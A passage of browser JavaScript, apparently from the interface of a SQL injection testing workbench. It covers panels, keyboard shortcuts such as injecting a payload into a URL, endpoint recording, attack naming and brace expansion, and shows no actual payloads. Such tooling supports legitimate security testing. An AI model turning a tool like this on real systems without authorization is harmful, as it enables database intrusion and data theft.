      document.body.style.overflow = 'hidden';
    }

    function closeModal() {
      modalOverlay.classList.remove('open');
      modalBody.innerHTML = '';
      document.body.style.overflow = '';
    }

    expandBtn.addEventListener('click', openModal);
    modalCloseBtn.addEventListener('click', closeModal);

    // Night Protect — 3 modes: 0 off, 1 soft, 2 strict
    const nightProtectBtns = () => [$('#nightProtectBtn'), $('#nightProtectBtnSettings')].filter(Boolean);

    function syncNightProtectBtn() {
      const mode = state.nightProtectMode | 0;
      state.nightProtect = mode > 0;
      const labels = ['🌙 Off', '🌙 Soft', '🌙 Strict'];
      const classes = ['np-off', 'np-soft', 'np-strict'];
      const titles = [
        'Night Protect OFF — click for Soft',
        'Night Protect Soft — click for Strict',
        'Night Protect Strict — click → Soft · double-click or Ctrl+click → Off',
      ];
      nightProtectBtns().forEach((btn) => {
        btn.classList.remove('np-off', 'np-soft', 'np-strict', 'active');
        btn.classList.add(classes[mode] || 'np-off');
        if (mode > 0) btn.classList.add('active');
        btn.textContent = labels[mode] || labels[0];
        btn.title = titles[mode] || titles[0];
      });
    }

    function setNightProtectMode(mode) {
      state.nightProtectMode = Math.max(0, Math.min(2, mode));
      state.nightProtect = state.nightProtectMode > 0;
      syncNightProtectBtn();
      if (state.activeHistoryId != null) {
        const item = state.history.find(h => h.id === state.activeHistoryId);
        if (item) displayResponse(item.response, item.url);
      } else if (state.lastRenderedHtml && state.nightProtectMode > 0) {
        // re-apply on current frame if possible via last response
      }
      const names = ['OFF', 'Soft', 'Strict'];
      showToast('Night Protect: ' + names[state.nightProtectMode], 'success');
    }

    function onNightProtectClick(e) {
      const mode = state.nightProtectMode | 0;
      const now = Date.now();
      // From Strict: safety — single click goes Soft; Ctrl+click or double-click turns Off
      if (mode === 2) {
        if (e.ctrlKey || e.metaKey) {
          setNightProtectMode(0);
          state._npLastClick = 0;
          return;
        }
        if (now - (state._npLastClick || 0) < 450) {
          setNightProtectMode(0);
          state._npLastClick = 0;
          return;
        }
        state._npLastClick = now;
        setNightProtectMode(1);
        return;
      }
      state._npLastClick = now;
      if (mode === 0) setNightProtectMode(1);
      else if (mode === 1) setNightProtectMode(2);
    }

    syncNightProtectBtn();
    nightProtectBtns().forEach((btn) => {
      btn.addEventListener('click', onNightProtectClick);
    });

    // Record navigations toggle
    const recordNavBtn = $('#recordNavBtn');
    function syncRecordBtn() {
      if (!recordNavBtn) return;
      recordNavBtn.classList.toggle('recording', state.recording);
      recordNavBtn.textContent = state.recording ? '■ Recording' : '● Record';
      const panel = $('#endpointPanel');
      if (panel && state.recording) panel.classList.remove('hidden');
    }
    if (recordNavBtn) {
      recordNavBtn.addEventListener('click', () => {
        state.recording = !state.recording;
        syncRecordBtn();
        renderEndpoints();
        showToast(state.recording ? 'Recording ON — browse the rendered page' : 'Recording OFF', 'success');
      });
    }
    const endpointPanelHeader = $('#endpointPanelHeader');
    const endpointMinBtn = $('#endpointMinBtn');
    if (endpointPanelHeader) {
      endpointPanelHeader.addEventListener('click', (e) => {
        if (e.target.closest('#clearEndpointsBtn')) return;
        const panel = $('#endpointPanel');
        if (!panel) return;
        panel.classList.toggle('minimized');
        if (endpointMinBtn) endpointMinBtn.textContent = panel.classList.contains('minimized') ? '▸' : '▾';
      });
    }
    const clearEndpointsBtn = $('#clearEndpointsBtn');
    if (clearEndpointsBtn) {
      clearEndpointsBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        state.endpoints = [];
        renderEndpoints();
        if (!state.recording) {
          const panel = $('#endpointPanel');
          if (panel) panel.classList.add('hidden');
        }
        showToast('Endpoints cleared');
      });
    }

    // Close on overlay click (outside the box)
    modalOverlay.addEventListener('click', (e) => {
      if (e.target === modalOverlay) closeModal();
    });

    // Close on Escape
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && modalOverlay.classList.contains('open')) {
        closeModal();
      }
    });

    // ===== Virtual Panel Manager (drawers / floating) =====
    const VPANEL_MAP = {
      payload: '#payloadWorkbench',
      history: '#historyPanel',
      cheat: '#cheatPanel',
      settings: '#settingsPanel',
      'adv-filter': '#advFilterPanel',
      'attack-dialog': '#attackNameDialog',
    };
    const PINNABLE = new Set(['payload', 'history']);
    const PIN_DEFAULTS = {
      payload: { top: '80px', right: '24px', width: '420px', height: '420px' },
      history: { top: '72px', left: '16px', width: '360px', height: Math.min(window.innerHeight * 0.7, 620) + 'px' },
    };
    const vpanelBackdrop = $('#vpanelBackdrop');
    let activeVPanel = null;
    let panelZCounter = 460;

    function isPanelPinnedOpen(name) {
      const el = $(VPANEL_MAP[name]);
      return !!(el && el.classList.contains('pinned') && el.classList.contains('open'));
    }
    function isPayloadPinnedOpen() { return isPanelPinnedOpen('payload'); }
    function isHistoryPinnedOpen() { return isPanelPinnedOpen('history'); }

    function anyPinnedOpen() {
      return [...PINNABLE].some((n) => isPanelPinnedOpen(n));
    }

    /** Raise a pinned panel above others and mark nav active */
    function focusPinnedPanel(name) {
      const panel = $(VPANEL_MAP[name]);
      if (!panel) return;
      panelZCounter += 1;
      panel.style.zIndex = String(panelZCounter);
      $$('.vpanel.pinned').forEach((el) => el.classList.remove('panel-front'));
      if (panel.classList.contains('pinned')) panel.classList.add('panel-front');
      activeVPanel = name;
      $$('.nav-tool').forEach((b) => b.classList.remove('active'));
      const navBtn = document.querySelector(`.nav-tool[data-panel="${name}"]`);
      if (navBtn) navBtn.classList.add('active');
    }

    function unpinPanel(name) {
      const el = $(VPANEL_MAP[name]);
      if (!el) return;
      el.classList.remove('pinned', 'panel-front');
      el.style.top = '';
      el.style.left = '';
      el.style.right = '';
      el.style.width = '';
      el.style.height = '';
      el.style.zIndex = '';
      const pinBtn = name === 'payload' ? $('#payloadPinBtn') : $('#historyPinBtn');
      if (pinBtn) {
        pinBtn.classList.remove('active');
        pinBtn.textContent = 'Pin';
      }
    }

    function openVPanel(name) {
      const sel = VPANEL_MAP[name];
      if (!sel) return;
      const panel = $(sel);
      if (!panel) return;

      Object.keys(VPANEL_MAP).forEach((k) => {
        if (k === name) return;
        const el = $(VPANEL_MAP[k]);
        if (!el) return;
        if (PINNABLE.has(k) && el.classList.contains('pinned') && el.classList.contains('open')) return;
        el.classList.remove('open');
      });
      $$('.nav-tool').forEach((b) => b.classList.remove('active'));

      panel.classList.add('open');
      activeVPanel = name;
      const navBtn = document.querySelector(`.nav-tool[data-panel="${name}"]`);
      if (navBtn) navBtn.classList.add('active');

      if (panel.classList.contains('pinned')) {
        focusPinnedPanel(name);
      }

      if (vpanelBackdrop) {
        if (PINNABLE.has(name) && panel.classList.contains('pinned')) {
          vpanelBackdrop.classList.remove('open');
        } else {
          vpanelBackdrop.classList.add('open');
        }
      }

      if (name === 'payload' && payloadInput) {
        setTimeout(() => payloadInput.focus(), 200);
      }
    }

    function closeVPanel(name) {
      if (!name || name === 'adv-filter') {
        if (typeof closeAdvMatchesOverlay === 'function') closeAdvMatchesOverlay();
      }
      const targets = name ? [name] : Object.keys(VPANEL_MAP);
      targets.forEach((k) => {
        const el = $(VPANEL_MAP[k]);
        if (!el) return;
        el.classList.remove('open');
        if (PINNABLE.has(k)) unpinPanel(k);
      });

      if (vpanelBackdrop) {
        const otherOpen = Object.keys(VPANEL_MAP).some((k) => {
          const el = $(VPANEL_MAP[k]);
          return el && el.classList.contains('open') && !(PINNABLE.has(k) && el.classList.contains('pinned'));
        });
        // non-pinned open panels need backdrop
        const needBd = Object.keys(VPANEL_MAP).some((k) => {
          const el = $(VPANEL_MAP[k]);
          return el && el.classList.contains('open') && !el.classList.contains('pinned');
        });
        vpanelBackdrop.classList.toggle('open', needBd);
      }
      $$('.nav-tool').forEach((b) => b.classList.remove('active'));
      // Prefer last focused among pinned
      if (isPanelPinnedOpen(activeVPanel)) {
        const navBtn = document.querySelector(`.nav-tool[data-panel="${activeVPanel}"]`);
        if (navBtn) navBtn.classList.add('active');
      } else if (isPayloadPinnedOpen()) {
        activeVPanel = 'payload';
        const navBtn = document.querySelector('.nav-tool[data-panel="payload"]');
        if (navBtn) navBtn.classList.add('active');
      } else if (isHistoryPinnedOpen()) {
        activeVPanel = 'history';
        const navBtn = document.querySelector('.nav-tool[data-panel="history"]');
        if (navBtn) navBtn.classList.add('active');
      } else {
        activeVPanel = null;
      }
    }

    function toggleVPanel(name) {
      const el = $(VPANEL_MAP[name]);
      if (el && el.classList.contains('open') && activeVPanel === name) closeVPanel(name);
      else openVPanel(name);
    }

    $$('.nav-tool[data-panel]').forEach((btn) => {
      btn.addEventListener('click', (e) => {
        const name = btn.dataset.panel;
        // Ctrl/Cmd+click on History or Payload → open pinned
        if ((e.ctrlKey || e.metaKey) && PINNABLE.has(name)) {
          openVPanel(name);
          const panel = $(VPANEL_MAP[name]);
          if (panel && !panel.classList.contains('pinned')) {
            setPanelPinned(name, true, PIN_DEFAULTS[name] || {});
          }
          focusPinnedPanel(name);
          return;
        }
        // Already pinned & open → just bring to front / activate
        if (PINNABLE.has(name) && isPanelPinnedOpen(name)) {
          focusPinnedPanel(name);
          return;
        }
        toggleVPanel(name);
      });
    });

    // Clicking a pinned panel body also brings it to front
    PINNABLE.forEach((name) => {
      const el = $(VPANEL_MAP[name]);
      if (!el) return;
      el.addEventListener('mousedown', () => {
        if (el.classList.contains('pinned') && el.classList.contains('open')) {
          focusPinnedPanel(name);
        }
      }, true);
    });
    $$('[data-close-panel]').forEach((btn) => {
      btn.addEventListener('click', (e) => {
        const panel = e.target.closest('.vpanel');
        const name = panel && panel.dataset.panel;
        closeVPanel(name || undefined);
      });
    });
    if (vpanelBackdrop) {
      vpanelBackdrop.addEventListener('click', () => {
        Object.keys(VPANEL_MAP).forEach((k) => {
          const el = $(VPANEL_MAP[k]);
          if (!el || !el.classList.contains('open')) return;
          if (el.classList.contains('pinned')) return;
          closeVPanel(k);
        });
      });
    }

    // ===== Shared Pin + Drag + Resize for Payload & History =====
    function setPanelPinned(name, on, defaults) {
      const panel = $(VPANEL_MAP[name]);
      if (!panel) return;
      panel.classList.toggle('pinned', !!on);
      const pinBtn = name === 'payload' ? $('#payloadPinBtn') : $('#historyPinBtn');
      if (pinBtn) {
        pinBtn.classList.toggle('active', !!on);
        pinBtn.textContent = on ? 'Pinned' : 'Pin';
      }
      if (on) {
        if (!panel.style.left && !panel.style.right && !panel.style.top) {
          panel.style.top = defaults.top;
          panel.style.left = defaults.left || 'auto';
          panel.style.right = defaults.right || 'auto';
          panel.style.width = defaults.width;
          panel.style.height = defaults.height;
        }
        if (vpanelBackdrop) vpanelBackdrop.classList.remove('open');
        showToast(`${name === 'payload' ? 'Payload' : 'History'} pinned — drag & resize`, 'success');
      } else {
        panel.style.top = '';
        panel.style.left = '';
        panel.style.right = '';
        panel.style.width = '';
        panel.style.height = '';
        if (panel.classList.contains('open') && vpanelBackdrop) {
          vpanelBackdrop.classList.add('open');
        }
      }
    }

    function setupPinnedDrag(panelSel, handleSel) {
      const handle = $(handleSel);
      if (!handle) return;
      handle.addEventListener('mousedown', (e) => {
        const panel = $(panelSel);
        if (!panel || !panel.classList.contains('pinned')) return;
        if (e.target.closest('button')) return;
        e.preventDefault();
        const rect = panel.getBoundingClientRect();
        const ox = e.clientX - rect.left;
        const oy = e.clientY - rect.top;
        panel.style.right = 'auto';
        panel.classList.add('no-transition');
        const onMove = (ev) => {
          let x = Math.max(0, Math.min(window.innerWidth - 80, ev.clientX - ox));
          let y = Math.max(0, Math.min(window.innerHeight - 40, ev.clientY - oy));
          panel.style.left = x + 'px';
          panel.style.top = y + 'px';
        };
        const onUp = () => {
          panel.classList.remove('no-transition');
          document.removeEventListener('mousemove', onMove);
          document.removeEventListener('mouseup', onUp);
        };
        document.addEventListener('mousemove', onMove);
        document.addEventListener('mouseup', onUp);
      });
    }

    function setupPinnedResize(panelSel) {
      $$(panelSel + ' .resize-grip').forEach((grip) => {
        grip.addEventListener('mousedown', (e) => {
          const panel = $(panelSel);
          if (!panel || !panel.classList.contains('pinned')) return;
          e.preventDefault();
          e.stopPropagation();
          const dir = grip.dataset.resize;
          const startX = e.clientX;
          const startY = e.clientY;
          const rect = panel.getBoundingClientRect();
          panel.style.right = 'auto';
          panel.style.left = rect.left + 'px';
          panel.style.top = rect.top + 'px';
          panel.style.width = rect.width + 'px';
          panel.style.height = rect.height + 'px';
          panel.classList.add('no-transition');
          const minW = 280, minH = 200;
          const onMove = (ev) => {
            let w = rect.width, h = rect.height, l = rect.left, t = rect.top;
            const dx = ev.clientX - startX;
            const dy = ev.clientY - startY;
            if (dir.includes('e')) w = Math.max(minW, rect.width + dx);
            if (dir.includes('s')) h = Math.max(minH, rect.height + dy);
            if (dir.includes('w')) { w = Math.max(minW, rect.width - dx); l = rect.left + (rect.width - w); }
            if (dir.includes('n')) { h = Math.max(minH, rect.height - dy); t = rect.top + (rect.height - h); }
            panel.style.width = w + 'px';
            panel.style.height = h + 'px';
            panel.style.left = l + 'px';
            panel.style.top = t + 'px';
          };
          const onUp = () => {
            panel.classList.remove('no-transition');
            document.removeEventListener('mousemove', onMove);
            document.removeEventListener('mouseup', onUp);
          };
          document.addEventListener('mousemove', onMove);
          document.addEventListener('mouseup', onUp);
        });
      });
    }

    const payloadPinBtn = $('#payloadPinBtn');
    if (payloadPinBtn) {
      payloadPinBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        const panel = $('#payloadWorkbench');
        setPanelPinned('payload', !panel.classList.contains('pinned'), {
          top: '80px', right: '24px', width: '420px', height: '420px',
        });
      });
    }
    const historyPinBtn = $('#historyPinBtn');
    if (historyPinBtn) {
      historyPinBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        const panel = $('#historyPanel');
        setPanelPinned('history', !panel.classList.contains('pinned'), {
          top: '72px', left: '16px', width: '360px', height: Math.min(window.innerHeight * 0.7, 620) + 'px',
        });
      });
    }
    setupPinnedDrag('#payloadWorkbench', '#payloadDragHandle');
    setupPinnedDrag('#historyPanel', '#historyDragHandle');
    setupPinnedResize('#payloadWorkbench');
    setupPinnedResize('#historyPanel');

    // Keep legacy names used elsewhere
    function setPayloadPinned(on) {
      setPanelPinned('payload', on, { top: '80px', right: '24px', width: '420px', height: '420px' });
    }

    // ===== Keyboard Shortcuts System =====
    // Use Ctrl+Alt / function keys to avoid browser conflicts (Ctrl+P print, Ctrl+H history, Ctrl+F find, …)
    const SHORTCUTS_KEY = 'sqli-workbench-shortcuts-v2';
    const DEFAULT_SHORTCUTS = {
      openPayload:   { label: 'Open Payload', group: 'Panels', key: 'p', ctrl: true, shift: false, alt: true },
      openHistory:   { label: 'Open History', group: 'Panels', key: 'h', ctrl: true, shift: false, alt: true },
      openCheat:     { label: 'Open Cheat Sheet', group: 'Panels', key: 'k', ctrl: true, shift: false, alt: true },
      openSettings:  { label: 'Open Settings', group: 'Panels', key: 's', ctrl: true, shift: false, alt: true },
      sendRequest:   { label: 'Send Request', group: 'Actions', key: 'Enter', ctrl: true, shift: false, alt: false },
      closePanel:    { label: 'Close panel', group: 'Panels', key: 'Escape', ctrl: false, shift: false, alt: false },
      histDelete:    { label: 'Delete selected history item', group: 'History', key: 'Delete', ctrl: false, shift: false, alt: false },
      histRename:    { label: 'Rename selected history item', group: 'History', key: 'F2', ctrl: false, shift: false, alt: false },
      histStar:      { label: 'Star/unstar selected item', group: 'History', key: 's', ctrl: false, shift: true, alt: false },
      histSearch:    { label: 'Focus history search', group: 'History', key: 'f', ctrl: true, shift: false, alt: true },
      pinPayload:    { label: 'Toggle pin Payload', group: 'Panels', key: 'p', ctrl: true, shift: true, alt: true },
      pinHistory:    { label: 'Toggle pin History', group: 'Panels', key: 'h', ctrl: true, shift: true, alt: true },
      injectPayload: { label: 'Inject payload into URL', group: 'Actions', key: 'i', ctrl: true, shift: false, alt: true },
    };

    function loadShortcuts() {
      try {
        const saved = JSON.parse(localStorage.getItem(SHORTCUTS_KEY) || '{}');
        const out = {};
        Object.keys(DEFAULT_SHORTCUTS).forEach((id) => {
          out[id] = { ...DEFAULT_SHORTCUTS[id], ...(saved[id] || {}) };
        });
        return out;
      } catch {
        return { ...DEFAULT_SHORTCUTS };
      }
    }

    let shortcuts = loadShortcuts();

    function saveShortcuts() {
      const toSave = {};
      Object.keys(shortcuts).forEach((id) => {
        const s = shortcuts[id];
        toSave[id] = { key: s.key, ctrl: s.ctrl, shift: s.shift, alt: s.alt };
      });
      try { localStorage.setItem(SHORTCUTS_KEY, JSON.stringify(toSave)); } catch {}
    }

    function formatShortcut(s) {
      if (!s || !s.key) return '—';
      const parts = [];
      if (s.ctrl) parts.push('Ctrl');
      if (s.alt) parts.push('Alt');
      if (s.shift) parts.push('Shift');
      let k = s.key;
      if (k === ' ') k = 'Space';
      if (k === 'Escape') k = 'Esc';
      if (k.length === 1) k = k.toUpperCase();
      parts.push(k);
      return parts.join('+');
    }

    function eventMatchesShortcut(e, s) {
      if (!s || !s.key) return false;
      const key = e.key.length === 1 ? e.key.toLowerCase() : e.key;
      const sk = s.key.length === 1 ? s.key.toLowerCase() : s.key;
      if (key !== sk && e.key !== s.key) return false;
      // For plain letter shortcuts without modifiers, require no ctrl/meta/alt
      // except when the shortcut itself requires them
      if (!!s.ctrl !== !!(e.ctrlKey || e.metaKey)) return false;
      if (!!s.shift !== !!e.shiftKey) return false;
      if (!!s.alt !== !!e.altKey) return false;
      return true;
    }

    function isTypingTarget(el) {
      if (!el) return false;
      const tag = (el.tagName || '').toLowerCase();
      if (tag === 'input' || tag === 'textarea' || tag === 'select') return true;
      if (el.isContentEditable) return true;
      return false;
    }

    function startRenameHistoryItem(id) {
      const nameEl = historyList && historyList.querySelector(`.history-name[data-id="${id}"]`);
      if (!nameEl) return;
      nameEl.contentEditable = 'true';
      nameEl.focus();
      const range = document.createRange();
      range.selectNodeContents(nameEl);
      const sel = window.getSelection();
      sel.removeAllRanges();
      sel.addRange(range);
    }

    function runShortcutAction(id) {
      switch (id) {
        case 'openPayload': toggleVPanel('payload'); break;
        case 'openHistory': toggleVPanel('history'); break;
        case 'openCheat': toggleVPanel('cheat'); break;
        case 'openSettings': toggleVPanel('settings'); break;
        case 'sendRequest': if (typeof sendRequest === 'function') sendRequest(); break;
        case 'closePanel':
          if (activeVPanel) {
            const el = $(VPANEL_MAP[activeVPanel]);
            if (el && el.classList.contains('pinned')) return; // don't force-close pinned via Esc shortcut if same as closePanel
            closeVPanel(activeVPanel);
          }
          break;
        case 'histDelete':
          if (state.activeHistoryId != null) deleteHistoryItem(state.activeHistoryId);
          break;
        case 'histRename':
          if (state.activeHistoryId != null) startRenameHistoryItem(state.activeHistoryId);
          break;
        case 'histStar': {
          if (state.activeHistoryId == null) break;
          const item = state.history.find((h) => h.id === state.activeHistoryId);
          if (item) {
            item.pinned = !item.pinned;
            renderHistory();
            showToast(item.pinned ? 'Starred' : 'Unstarred');
          }
          break;
        }
        case 'histSearch': {
          openVPanel('history');
          setTimeout(() => { const s = $('#historySearch'); if (s) s.focus(); }, 150);
          break;
        }
        case 'pinPayload': {
          const panel = $('#payloadWorkbench');
          if (!panel.classList.contains('open')) openVPanel('payload');
          setPanelPinned('payload', !panel.classList.contains('pinned'), {
            top: '80px', right: '24px', width: '420px', height: '420px',
          });
          break;
        }
        case 'pinHistory': {
          const panel = $('#historyPanel');
          if (!panel.classList.contains('open')) openVPanel('history');
          setPanelPinned('history', !panel.classList.contains('pinned'), {
            top: '72px', left: '16px', width: '360px', height: Math.min(window.innerHeight * 0.7, 620) + 'px',
          });
          break;
        }
        case 'injectPayload': {
          const btn = $('#injectBtn');
          if (btn) btn.click();
          break;
        }
        default: break;
      }
    }

    // Global shortcut listener
    document.addEventListener('keydown', (e) => {
      // Don't intercept while rebinding
      if (window.__shortcutListening) return;
      const modal = $('#modalOverlay');
      if (modal && modal.classList.contains('open')) return;
      const attackDlg = $('#attackNameDialog');
      if (attackDlg && attackDlg.classList.contains('open')) return;

      const typing = isTypingTarget(e.target);

      for (const [id, s] of Object.entries(shortcuts)) {
        if (!eventMatchesShortcut(e, s)) continue;

        // When typing in inputs, only allow shortcuts that use Ctrl/Meta/Alt (or F-keys / Escape / Delete outside pure text)
        if (typing) {
          const isMod = s.ctrl || s.alt;
          const isSpecial = ['Escape', 'F2', 'Delete', 'Enter'].includes(s.key);
          // Allow Ctrl+Enter send even in inputs; allow F2/Delete only when not in a text field for rename context
          if (id === 'sendRequest' && s.ctrl && s.key === 'Enter') {
            e.preventDefault();
            runShortcutAction(id);
            return;
          }
          if (!isMod && !(id === 'closePanel' && s.key === 'Escape')) {
            continue;
          }
          if (id.startsWith('hist') && (e.target.closest && e.target.closest('.hist-note, .history-search, [contenteditable="true"]'))) {
            // allow F2/Delete only when not editing note/search/name
            if (e.target.closest('.hist-note, .history-search') || e.target.isContentEditable) continue;
          }
        }

        // History-context shortcuts require history open or an active item
        if (id.startsWith('hist') && id !== 'histSearch') {
          const histOpen = $('#historyPanel')?.classList.contains('open');
          if (!histOpen && state.activeHistoryId == null) continue;
        }

        e.preventDefault();
        runShortcutAction(id);
        return;
      }
    });

    // Shortcuts settings UI
    let listeningFor = null;
    function renderShortcutsList() {
      const list = $('#shortcutsList');
      if (!list) return;
      const groups = {};
      Object.entries(shortcuts).forEach(([id, s]) => {
        const g = s.group || 'Other';
        if (!groups[g]) groups[g] = [];
        groups[g].push({ id, ...s });
      });
      list.innerHTML = Object.entries(groups).map(([group, items]) => `
        <div style="font-size:10px;font-weight:700;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;margin:10px 0 4px;">${escapeHtml(group)}</div>
        ${items.map((s) => `
          <div class="shortcut-row" data-id="${s.id}">
            <div class="shortcut-label">${escapeHtml(s.label)}</div>
            <button type="button" class="shortcut-key" data-id="${s.id}">${formatShortcut(s)}</button>
          </div>
        `).join('')}
      `).join('');

      list.querySelectorAll('.shortcut-key').forEach((btn) => {
        btn.addEventListener('click', () => {
          list.querySelectorAll('.shortcut-key').forEach((b) => {
            b.classList.remove('listening');
            b.textContent = formatShortcut(shortcuts[b.dataset.id]);
          });
          btn.classList.add('listening');
          btn.textContent = 'Press keys…';
          listeningFor = btn.dataset.id;
          window.__shortcutListening = true;
        });
      });
    }

    document.addEventListener('keydown', (e) => {
      if (!window.__shortcutListening || !listeningFor) return;
      e.preventDefault();
      e.stopPropagation();
      if (e.key === 'Escape') {
        window.__shortcutListening = false;
        listeningFor = null;
        renderShortcutsList();
        return;
      }
      // ignore pure modifier presses
      if (['Control', 'Shift', 'Alt', 'Meta'].includes(e.key)) return;
      const id = listeningFor;
      shortcuts[id] = {
        ...shortcuts[id],
        key: e.key.length === 1 ? e.key.toLowerCase() : e.key,
        ctrl: !!(e.ctrlKey || e.metaKey),
        shift: !!e.shiftKey,
        alt: !!e.altKey,
      };
      saveShortcuts();
      window.__shortcutListening = false;
      listeningFor = null;
      renderShortcutsList();
      showToast('Shortcut saved', 'success');
    }, true);

    const shortcutsResetBtn = $('#shortcutsResetBtn');
    if (shortcutsResetBtn) {
      shortcutsResetBtn.addEventListener('click', () => {
        try { localStorage.removeItem(SHORTCUTS_KEY); } catch {}
        shortcuts = loadShortcuts();
        renderShortcutsList();
        showToast('Shortcuts reset', 'success');
      });
    }

    // ===== Attack Name Dialog (replaces browser prompt) =====
    function promptAttackMeta(defaultName) {
      return new Promise((resolve) => {
        const dialog = $('#attackNameDialog');
        const nameInput = $('#attackNameInput');
        const noteInput = $('#attackNoteInput');
        const btnOk = $('#attackDialogConfirm');
        const btnCancel = $('#attackDialogCancel');
        const btnX = $('#attackDialogCancelX');
        if (!dialog || !nameInput) {
          resolve({ name: defaultName, note: '', cancelled: false });
          return;
        }
        nameInput.value = defaultName || '';
        if (noteInput) noteInput.value = '';
        dialog.classList.add('open');
        if (vpanelBackdrop) vpanelBackdrop.classList.add('open');
        setTimeout(() => { nameInput.focus(); nameInput.select(); }, 50);

        const cleanup = () => {
          dialog.classList.remove('open');
          btnOk.removeEventListener('click', onOk);
          btnCancel.removeEventListener('click', onCancel);
          if (btnX) btnX.removeEventListener('click', onCancel);
          nameInput.removeEventListener('keydown', onKey);
        };
        const onOk = () => {
          const name = (nameInput.value || '').trim() || defaultName;
          const note = (noteInput && noteInput.value || '').trim();
          cleanup();
          // restore backdrop state for pinned payload
          if (vpanelBackdrop && isPayloadPinnedOpen()) vpanelBackdrop.classList.remove('open');
          resolve({ name, note, cancelled: false });
        };
        const onCancel = () => {
          cleanup();
          if (vpanelBackdrop && isPayloadPinnedOpen()) vpanelBackdrop.classList.remove('open');
          else if (vpanelBackdrop) vpanelBackdrop.classList.remove('open');
          resolve({ name: '', note: '', cancelled: true });
        };
        const onKey = (e) => {
          if (e.key === 'Enter') { e.preventDefault(); onOk(); }
          if (e.key === 'Escape') { e.preventDefault(); onCancel(); }
        };
        btnOk.addEventListener('click', onOk);
        btnCancel.addEventListener('click', onCancel);
        if (btnX) btnX.addEventListener('click', onCancel);
        nameInput.addEventListener('keydown', onKey);
      });
    }

    // Legacy collapse API → virtual panels
    function setupCollapse() { /* no-op: panels are virtual now */ }
    setupCollapse();

    // ===== Panel Resize (drag) =====
    function setupResize(handleId, panelSel, cssVar, minW, maxRatio) {
      const handle = $(handleId);
      const panel = $(panelSel);
      if (!handle || !panel) return;
      let startX = 0, startW = 0;
      handle.addEventListener('mousedown', (e) => {
        e.preventDefault();
        startX = e.clientX;
        startW = panel.getBoundingClientRect().width;
        panel.classList.add('no-transition');
        handle.classList.add('dragging');
        document.body.classList.add('resizing');
        const onMove = (ev) => {
          let dx = ev.clientX - startX;
          // history handle is after the panel, so dragging right grows it; cheat same
          let w = startW + dx;
          const maxW = window.innerWidth * (maxRatio || 0.5);
          w = Math.max(minW || 160, Math.min(maxW, w));
          panel.style.width = w + 'px';
          panel.style.minWidth = w + 'px';
          if (cssVar) document.documentElement.style.setProperty(cssVar, w + 'px');
        };
        const onUp = () => {
          panel.classList.remove('no-transition');
          handle.classList.remove('dragging');
          document.body.classList.remove('resizing');
          document.removeEventListener('mousemove', onMove);
          document.removeEventListener('mouseup', onUp);
        };
        document.addEventListener('mousemove', onMove);
        document.addEventListener('mouseup', onUp);
      });
    }
    setupResize('#resizeCheat', '#cheatPanel', '--cheat-width', 160, 0.4);
    setupResize('#resizeHistory', '#historyPanel', '--history-width', 200, 0.55);

    // ===== Response minimize / History focus =====
    const responsePanel = $('#responsePanel');
    const minimizeResponseBtn = $('#minimizeResponseBtn');
    const responseMiniLabel = $('#responseMiniLabel');
    const focusHistoryBtn = $('#focusHistoryBtn');
    const historyPanelEl = $('#historyPanel');

    function setResponseCollapsed(collapsed) {
      if (!responsePanel) return;
      responsePanel.classList.toggle('collapsed-panel', collapsed);
      if (historyPanelEl) historyPanelEl.classList.toggle('expanded-focus', collapsed);
      if (focusHistoryBtn) focusHistoryBtn.textContent = collapsed ? '⧉' : '⛶';
    }
    if (minimizeResponseBtn) {
      minimizeResponseBtn.addEventListener('click', () => setResponseCollapsed(true));
    }
    if (responseMiniLabel) {
      responseMiniLabel.addEventListener('click', () => setResponseCollapsed(false));
    }
    if (focusHistoryBtn) {
      focusHistoryBtn.addEventListener('click', () => {
        const isCollapsed = responsePanel && responsePanel.classList.contains('collapsed-panel');
        setResponseCollapsed(!isCollapsed);
      });
    }

    // ===== Attack panel minimize =====
    const attackConfigHeader = $('#attackConfigHeader');
    const atkMinBtn = $('#atkMinBtn');
    function toggleAttackPanelMin() {
      const panel = $('#attackConfigPanel');
      if (!panel || panel.classList.contains('hidden')) return;
      panel.classList.toggle('minimized');
      if (atkMinBtn) atkMinBtn.textContent = panel.classList.contains('minimized') ? '▸' : '▾';
    }
    if (attackConfigHeader) {
      attackConfigHeader.addEventListener('click', (e) => {
        if (e.target.closest('input, select, button') && e.target.id !== 'atkMinBtn') return;
        toggleAttackPanelMin();
      });
    }

    // Payload collapse + one-line summary when collapsed
    const payloadWorkbench = $('#payloadWorkbench');
    const collapsePayloadBtn = $('#collapsePayloadBtn');
    const payloadHeader = $('#payloadHeader');
    const payloadSummary = $('#payloadSummary');

    function updatePayloadSummary() {
      if (!payloadSummary) return;
      const raw = (payloadInput && payloadInput.value || '').trim();
      if (!raw) {
        payloadSummary.textContent = '— empty — click to edit —';
        return;
      }
      const lines = raw.split('\n').filter(Boolean);
      const first = lines[0].slice(0, 80);
      const extra = lines.length > 1 ? `  ·  ${lines.length} lines` : '';
      payloadSummary.textContent = first + (lines[0].length > 80 ? '…' : '') + extra;
    }

    function setPayloadCollapsed(collapsed) {
      // Virtual panel: collapsed = closed — but never force-close when pinned
      if (collapsed) {
        const el = $('#payloadWorkbench');
        if (el && el.classList.contains('pinned')) {
          updatePayloadSummary();
          return;
        }
        closeVPanel('payload');
      } else {
        openVPanel('payload');
      }
      updatePayloadSummary();
    }

    function togglePayload() {
      toggleVPanel('payload');
    }

    if (payloadInput) {
      payloadInput.addEventListener('input', updatePayloadSummary);
    }
    updatePayloadSummary();

    if (collapsePayloadBtn) {
      collapsePayloadBtn.addEventListener('click', (e) => { e.stopPropagation(); togglePayload(); });
    }
    if (payloadHeader) {
      payloadHeader.addEventListener('click', (e) => {
        if (e.target.closest('.collapse-btn')) return;
        togglePayload();
      });
    }

    // ===== Brace Expansion (bash-style) =====
    function expandBraceSegment(seg) {
      // {1..10} or {01..10} or {a..z} or {1,2,3}
      if (seg.includes('..')) {
        const [a, b] = seg.split('..');
        const start = a.trim();
        const end = b.trim();
        // numeric range
        if (/^-?\d+$/.test(start) && /^-?\d+$/.test(end)) {
          const s = parseInt(start, 10);
          const e = parseInt(end, 10);
          const pad = (start[0] === '0' || end[0] === '0') ? Math.max(start.length, end.length) : 0;
          const out = [];
          const step = s <= e ? 1 : -1;
          for (let i = s; step > 0 ? i <= e : i >= e; i += step) {
            out.push(pad ? String(i).padStart(pad, '0') : String(i));
          }
